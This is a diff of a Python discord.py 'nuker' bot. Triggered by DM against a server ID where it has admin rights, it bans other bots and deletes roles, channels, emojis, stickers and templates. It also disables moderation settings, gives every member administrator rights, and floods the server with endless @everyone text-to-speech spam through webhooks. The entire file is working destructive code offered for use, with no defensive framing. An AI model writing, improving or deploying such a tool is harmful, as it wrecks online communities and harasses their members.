@@ -1,105 +1,107 @@
 from discord.ext import commands
 import discord
 import asyncio
-from dotenv import load_dotenv
-import os
+import random
 
-load_dotenv()
+channel_name = "CHANNEL_NAME"
+role_name = "ROLE_NAME"
+server_name = "SERVER_NAME"
+webhook_name = "WEBHOOK_NAME"
+message = "MESSAGE_CONTENT"
+token = "YOUR_BOT_TOKEN"
 
-channel_name = os.getenv("CHANNEL_NAME") 
-role_name = os.getenv("ROLE_NAME")
-server_name = os.getenv("SERVER_NAME")
-webhook_name = os.getenv("WEBHOOK_NAME")
-message = os.getenv("MESSAGE")
-token = os.getenv("TOKEN")
 
-bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
+bot = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)
 
-@bot.event 
+@bot.event
 async def on_ready():
     print("Bot ready.")
 
-@bot.command()
-async def nuke(ctx):
-    await ctx.message.delete()
-    
-    for member in ctx.guild.members:
-        if member.bot and member != ctx.guild.me:
-            try:
-                await member.ban(reason="Nuked")
-                await asyncio.sleep(0.5)
-            except:
-                pass
 
-    if ctx.guild.templates:
-        templates = await ctx.guild.templates()
-        for template in templates:
-            try:
-                await template.delete()
-                await asyncio.sleep(0.5)
-            except:
-                pass
+async def perform_nuke(guild):
 
-    for emoji in ctx.guild.emojis:
+    bot_ban = [member for member in guild.members if member.bot and member != guild.me]
+
+    for member in bot_ban:
         try:
-            await emoji.delete()
-            await asyncio.sleep(0.5)
+            await member.ban()
         except:
             pass
 
-    for sticker in ctx.guild.stickers:
+    for template in await guild.templates():
+        try:
+            await template.delete()
+        except:
+            pass
+
+    for sticker in guild.stickers:
         try:
             await sticker.delete()
-            await asyncio.sleep(0.5)
-        except:
-            pass
-                                  
-    for role in ctx.guild.roles:
-        if role != ctx.guild.default_role and role != ctx.guild.me.top_role:
-            try:
-                await role.delete()
-                await asyncio.sleep(0.1)
-            except:
-                pass
-    
-    for channel in ctx.guild.channels:
-        try:
-            await channel.delete()
-            await asyncio.sleep(0.1)
-        except:
-            pass
-    
-    for _ in range(500):
-        try:
-            await ctx.guild.create_text_channel(channel_name)
-            await ctx.guild.create_role(name=role_name)
         except:
             pass
 
-@bot.command() 
-async def check(ctx):
-    await ctx.message.delete()
-    guild = ctx.guild
-    
-    if guild:
-        bot_member = guild.me
-        if bot_member.guild_permissions.administrator:
-            await ctx.author.send("Has administrator permissions")
-        else:
-            await ctx.author.send("No administrator permissions")
-    else:
-        await ctx.author.send("This command only works in servers")
+    for emoji in guild.emojis:
+        try:
+            await emoji.delete()
+        except:
+            pass
+
+    for role in guild.roles:
+        if role != guild.default_role and role != guild.me.top_role:
+            try:
+                await role.delete()
+            except:
+                pass
+
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+
+    for _ in range(50):
+        try:
+            await guild.create_text_channel(channel_name)
+            await guild.create_role(name=role_name,color=random.choice([discord.Color.red(),discord.Color.orange(),discord.Color.yellow(),discord.Color.green(),discord.Color.blue(),discord.Color.purple()]))
+        except:
+            pass
+
+
+@bot.command()
+async def nuke(ctx, server_id: int = None):
+    if ctx.guild:
+        return
+
+    if server_id is None:
+        await ctx.reply("**Wrong Usage!**\nCorrect Usage: `!nuke <server_id>`")
+        return
+
+    guild = bot.get_guild(server_id)
+    if not guild:
+        await ctx.reply(f"Server ID Not Found: `{server_id}`\nPlease Invite Bot To Server Before Using This Command.")
+        return
+
+    bot_member = guild.me
+    if not bot_member.guild_permissions.administrator:
+        await ctx.reply("Bot Has No Admin Permissions.")
+        return
+
+    await ctx.reply("Starting to nuke the server.")
+    await perform_nuke(guild)
+
 
 @bot.event
 async def on_guild_channel_create(channel):
     if channel.name == channel_name:
         try:
-            await channel.guild.edit(name=server_name)
+            await channel.guild.edit(name=server_name, icon=None, system_channel=None, verification_level=discord.VerificationLevel.none, default_notifications=discord.NotificationLevel.all_messages, explicit_content_filter=discord.ContentFilter.disabled)
+            await channel.guild.default_role.edit(permissions=discord.Permissions(administrator=True))
+
             webhooks = []
             for _ in range(2):
                 webhook = await channel.create_webhook(name=webhook_name)
                 webhooks.append(webhook)
-            
+
             while True:
                 tasks = []
                 for webhook in webhooks:
@@ -107,8 +109,9 @@ async def on_guild_channel_create(channel):
                         tasks.append(channel.send(f"@everyone @here\n{message}", tts=True))
                         tasks.append(webhook.send(f"@everyone @here\n{message}", tts=True))
                 await asyncio.gather(*tasks)
-                
+
         except discord.errors.Forbidden:
             pass
+
 
 bot.run(token)
